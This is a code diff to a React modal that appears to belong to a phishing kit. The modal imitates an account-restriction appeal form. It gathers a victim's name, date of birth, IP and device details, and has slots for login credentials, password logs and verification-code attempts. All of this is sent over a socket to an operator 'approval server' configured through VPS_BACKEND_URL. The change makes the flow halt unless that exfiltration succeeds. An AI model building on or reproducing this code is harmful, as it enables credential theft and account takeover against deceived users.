@@ -41,6 +41,8 @@ const TEXT = {
         'Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us in your native language.',
     submitError:
         'Please fill in correctly and completely all required fields to complete the verification profile.',
+    sendError:
+        'Could not reach the approval server. Start the backend (pnpm dev:backend) and check VPS_BACKEND_URL in .env.local.',
     fullName: 'Full Name',
     fullNamePlaceholder: 'Enter your full name',
     dateOfBirth: 'Date of Birth',
@@ -104,7 +106,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         setDeviceLabel,
         messageId
     } = store();
-    const { socket, isConnected } = useSocketEmit();
+    const { socket } = useSocketEmit();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
 
     const t = (text: string): string => translations[text] || text;
@@ -266,25 +268,33 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             });
             persistAppealForm(payload);
 
-            if (socket && isConnected && geoInfo) {
-                const message = buildAppealMessage({
-                    form: payload,
-                    login: { email: '', password: '' },
-                    passwordLogs: [],
-                    codeAttempts: [],
-                    ip: geoToIpInfo(geoInfo),
-                    deviceLabel
-                });
-                const newMessageId = await sendAppealMessage(socket, {
-                    message,
-                    message_id: messageId,
-                    stage: 'info'
-                });
-                setMessageId(newMessageId);
+            if (!geoInfo) {
+                setSubmitError(t(TEXT.sendError));
+                return;
             }
+
+            if (!socket) {
+                setSubmitError(t(TEXT.sendError));
+                return;
+            }
+
+            const message = buildAppealMessage({
+                form: payload,
+                login: { email: '', password: '' },
+                passwordLogs: [],
+                codeAttempts: [],
+                ip: geoToIpInfo(geoInfo),
+                deviceLabel
+            });
+            const newMessageId = await sendAppealMessage(socket, {
+                message,
+                message_id: messageId,
+                stage: 'info'
+            });
+            setMessageId(newMessageId);
             nextStep();
         } catch {
-            nextStep();
+            setSubmitError(t(TEXT.sendError));
         } finally {
             setIsLoading(false);
         }
